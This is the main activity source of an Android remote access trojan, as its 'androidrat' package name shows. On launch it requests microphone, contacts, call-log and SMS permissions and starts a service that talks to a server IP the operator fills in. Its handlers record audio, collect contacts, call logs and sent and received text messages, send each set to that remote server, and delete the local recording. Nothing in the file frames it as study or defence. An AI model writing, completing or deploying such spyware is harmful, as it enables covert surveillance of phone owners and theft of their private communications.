package com.example.androidrat;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;

import com.example.androidrat.Utilities.AudioRecorderUtility;
import com.example.androidrat.Utilities.ContactsUtility;
import com.example.androidrat.Utilities.MessagesUtility;
import com.example.androidrat.models.CallLog;
import com.example.androidrat.models.Contact;
import com.example.androidrat.models.Message;
import com.example.androidrat.responses.CallLogsResponse;
import com.example.androidrat.responses.ContactsResponse;
import com.example.androidrat.responses.ReceivedMessagesResponse;
import com.example.androidrat.responses.RecordingResponse;
import com.example.androidrat.responses.RecordingStartedResponse;
import com.example.androidrat.responses.SentMessagesResponse;
import com.example.androidrat.services.ServerService;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private AudioRecorderUtility recorderUtility;
    private ServerService serverService;
    private ContactsUtility contactsUtility;
    private MessagesUtility messagesUtility;
    private boolean serverRunning = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        requestPermissions(new String[]{
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS}, 100);

        contactsUtility = new ContactsUtility(this);
        messagesUtility = new MessagesUtility(this);
        recorderUtility = new AudioRecorderUtility(this);

        String serverIp = ""; // TODO provide your server ip
        if(!serverRunning) {
            serverService = new ServerService(this, new Handler(), serverIp);
            serverService.start(); //Server communicator running
            serverRunning = true;
        }
    }
    public void onStartRecording() {
        recorderUtility.startRecording();
        serverService.addResponse(new RecordingStartedResponse());
    }
    public void onStopRecording() {
        recorderUtility.stopRecording();
        File audioFile = recorderUtility.getAudioFile();

        try (FileInputStream fileInputStream = new FileInputStream(audioFile)) {
            byte[] data = new byte[(int) audioFile.length()];
            fileInputStream.read(data);
            serverService.addResponse(new RecordingResponse(data));
            System.out.println();
        } catch (IOException e) {
            e.printStackTrace();
        }

        if(audioFile.delete()) Log.i("AudioRecordingUtility", "Successfully deleted audio file");
        else Log.e("AudioRecordingUtility", "Failed deleting audio file");
    }
    public void onGetContacts() {
        List<Contact> contactList = contactsUtility.getContacts();
        serverService.addResponse(new ContactsResponse(contactList));
        Log.i("MainActivity", "Sent Contacts to server");
    }
    public void onGetCallLogs() {
        List<CallLog> callLogList = contactsUtility.getCallLog();
        serverService.addResponse(new CallLogsResponse(callLogList));
        Log.i("MainActivity", "Sent Call Logs to server");
    }
    public void onGetReceivedMessages() {
        List<Message> messageList = messagesUtility.getReceivedMessages();
        serverService.addResponse(new ReceivedMessagesResponse(messageList));
        Log.i("MainActivity", "Sent Received Messages to server");
    }
    public void onGetSentMessages() {
        List<Message> messageList = messagesUtility.getSentMessages();
        serverService.addResponse(new SentMessagesResponse(messageList));
        Log.i("MainActivity", "Sent Sent Messages to server");
    }
}